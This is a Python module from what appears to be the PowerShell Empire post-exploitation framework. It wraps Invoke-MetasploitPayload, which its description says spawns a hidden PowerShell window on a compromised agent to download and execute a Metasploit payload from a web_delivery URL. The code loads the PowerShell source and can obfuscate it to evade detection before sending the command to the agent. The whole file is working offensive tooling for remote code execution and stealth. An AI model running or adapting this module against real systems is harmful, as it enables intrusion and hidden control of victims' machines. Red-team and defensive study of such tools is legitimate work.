import os.path
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-MetasploitPayload',
            'Author': ['@jaredhaight'],
            'Description': ('Spawns a new, hidden PowerShell window that downloads'
                            'and executes a Metasploit payload. This relies on the'
                            'exploit/multi/scripts/web_delivery metasploit module.'),
            'Background' : False,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'MinPSVersion' : '2',
            'Comments': [
                'https://github.com/jaredhaight/Invoke-MetasploitPayload/'
            ]
        }

        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run Metasploit payload on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'URL' : {
                'Description'   :   'URL from the Metasploit web_delivery module',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-MetasploitPayload.ps1"
        if obfuscate:
            moduleSource = self.mainMenu.installPath + "/data/obfuscated_module_source/code_execution/Invoke-MetasploitPayload.ps1"
            if not self.is_obfuscated():
                self.obfuscate(obfuscationCommand=obfuscationCommand)
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        script += "\nInvoke-MetasploitPayload"

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])

        return script

    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
        if self.is_obfuscated() and not forceReobfuscation:
            return

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-MetasploitPayload.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        # obfuscate and write to obfuscated source path
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/code_execution/Invoke-MetasploitPayload.ps1"
        obfuscatedCode = helpers.obfuscate(psScript=moduleCode, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        try:
            f = open(obfuscatedSource, 'w')
        except:
            print helpers.color("[!] Could not read obfuscated module source path at: " + str(obfuscatedSource))
            return ""
        f.write(obfuscatedCode)
        f.close()

    def is_obfuscated(self):
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/code_execution/Invoke-MetasploitPayload.ps1"
        return os.path.isfile(obfuscatedSource)
